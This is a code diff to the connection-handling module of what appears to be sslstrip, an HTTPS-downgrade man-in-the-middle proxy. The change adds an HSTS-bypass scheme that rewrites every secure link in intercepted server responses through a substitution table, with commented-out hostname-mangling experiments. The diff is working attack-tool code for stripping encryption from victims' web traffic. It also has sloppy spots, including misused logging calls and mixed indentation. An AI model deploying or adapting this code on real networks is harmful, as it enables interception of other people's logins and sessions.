@@ -16,12 +16,12 @@
 # USA
 #
 
-import logging, re, string, random, zlib, gzip, StringIO, sys
+import logging, re, string, random, zlib, gzip, StringIO
 import plugins
 
 from twisted.web.http import HTTPClient
 from ResponseTampererFactory import ResponseTampererFactory
-from URLMonitor import URLMonitor
+from URLMonitorHSTS import URLMonitor
 from ProxyPlugins import ProxyPlugins
 
 class ServerConnection(HTTPClient):
@@ -33,7 +33,12 @@ class ServerConnection(HTTPClient):
 
     urlExpression     = re.compile(r"(https://[\w\d:#@%/;$()~_?\+-=\\\.&]*)", re.IGNORECASE)
     urlType           = re.compile(r"https://", re.IGNORECASE)
+    urlTypewww        = re.compile(r"https://www", re.IGNORECASE)
+    urlwExplicitPort  = re.compile(r'https://www([a-zA-Z0-9.]+):[0-9]+/',  re.IGNORECASE)
     urlExplicitPort   = re.compile(r'https://([a-zA-Z0-9.]+):[0-9]+/',  re.IGNORECASE)
+    urlToken1 		  = re.compile(r'(https://[a-zA-Z0-9./]+\?)', re.IGNORECASE)
+    urlToken2 		  = re.compile(r'(https://[a-zA-Z0-9./]+)\?{0}', re.IGNORECASE)
+#    urlToken2 		  = re.compile(r'(https://[a-zA-Z0-9.]+/?[a-zA-Z0-9.]*/?)\?{0}', re.IGNORECASE)
 
     def __init__(self, command, uri, postData, headers, client):
         self.command          = command
@@ -49,6 +54,9 @@ class ServerConnection(HTTPClient):
         self.contentLength    = None
         self.shutdownComplete = False
 
+    def getLogLevel(self):
+        return logging.DEBUG
+
     def getPostPrefix(self):
         return "POST"
 
@@ -60,7 +68,7 @@ class ServerConnection(HTTPClient):
 
     def sendHeaders(self):
         for header, value in self.headers.items():
-            logging.debug("Sending header: %s : %s" % (header, value))
+            logging.debug(self.getLogLevel(), "Sending header: %s : %s" % (header, value))
             self.sendHeader(header, value)
 
         self.endHeaders()
@@ -75,7 +83,7 @@ class ServerConnection(HTTPClient):
             self.transport.write(self.postData)
 
     def connectionMade(self):
-        logging.debug("HTTP connection made.")
+        logging.debug(self.getLogLevel(), "HTTP connection made.")
         self.plugins.hook()
         self.sendRequest()
         self.sendHeaders()
@@ -84,10 +92,12 @@ class ServerConnection(HTTPClient):
             self.sendPostData()
 
     def handleStatus(self, version, code, message):
-        logging.debug("Got server response: %s %s %s" % (version, code, message))
+        logging.debug(self.getLogLevel(), "Got server response: %s %s %s" % (version, code, message))
         self.client.setResponseCode(int(code), message)
 
     def handleHeader(self, key, value):
+        logging.debug("Got server header: %s:%s" % (key, value))
+
         if (key.lower() == 'location'):
             value = self.replaceSecureLinks(value)
 
@@ -108,6 +118,7 @@ class ServerConnection(HTTPClient):
             self.client.setHeader(key, value)
 
         self.plugins.hook()
+            
 
     def handleEndHeaders(self):
        if (self.isImageRequest and self.contentLength != None):
@@ -127,7 +138,7 @@ class ServerConnection(HTTPClient):
             self.shutdown()
         else:
             try:
-                HTTPClient.handleResponseEnd(self) #Gets rid of some generic errors
+                HTTPClient.handleResponseEnd(self)
             except:
                 pass
 
@@ -137,6 +148,7 @@ class ServerConnection(HTTPClient):
             data = gzip.GzipFile('', 'rb', 9, StringIO.StringIO(data)).read()
             
         logging.debug("Read from server:\n" + data)
+        #logging.log(self.getLogLevel(), "Read from server:\n <large data>" )
 
         data = self.replaceSecureLinks(data)
 
@@ -161,19 +173,36 @@ class ServerConnection(HTTPClient):
             logging.info("Client connection dropped before request finished.")
 
     def replaceSecureLinks(self, data):
-        iterator = re.finditer(ServerConnection.urlExpression, data)
+        sustitucion = {}
+        patchDict = self.urlMonitor.patchDict
+        if len(patchDict)>0:
+        	dregex = re.compile("(%s)" % "|".join(map(re.escape, patchDict.keys())))
+        	data = dregex.sub(lambda x: str(patchDict[x.string[x.start() :x.end()]]), data)
 
+		iterator = re.finditer(ServerConnection.urlExpression, data)       
         for match in iterator:
             url = match.group()
 
             logging.debug("Found secure reference: " + url)
+            nuevaurl=self.urlMonitor.addSecureLink(self.client.getClientIP(), url)
+            logging.debug("LEO replacing %s => %s"%(url,nuevaurl))
+            sustitucion[url] = nuevaurl
+            #data.replace(url,nuevaurl)
 
-            url = url.replace('https://', 'http://', 1)
-            url = url.replace('&amp;', '&')
-            self.urlMonitor.addSecureLink(self.client.getClientIP(), url)
+        #data = self.urlMonitor.DataReemplazo(data)
+        if len(sustitucion)>0:
+        	dregex = re.compile("(%s)" % "|".join(map(re.escape, sustitucion.keys())))
+        	data = dregex.sub(lambda x: str(sustitucion[x.string[x.start() :x.end()]]), data)
 
-        data = re.sub(ServerConnection.urlExplicitPort, r'http://\1/', data)
-        return re.sub(ServerConnection.urlType, 'http://', data)
+        #logging.debug("LEO DEBUG received data:\n"+data)	
+        #data = re.sub(ServerConnection.urlExplicitPort, r'https://\1/', data)
+        #data = re.sub(ServerConnection.urlTypewww, 'http://w', data)
+        #if data.find("http://w.face")!=-1:
+        #	logging.debug("LEO DEBUG Found error in modifications")
+        #	raw_input("Press Enter to continue")
+        #return re.sub(ServerConnection.urlType, 'http://web.', data)
+        return data
+
 
     def shutdown(self):
         if not self.shutdownComplete:
@@ -183,5 +212,3 @@ class ServerConnection(HTTPClient):
                 self.transport.loseConnection()
             except:
                 pass
-
-
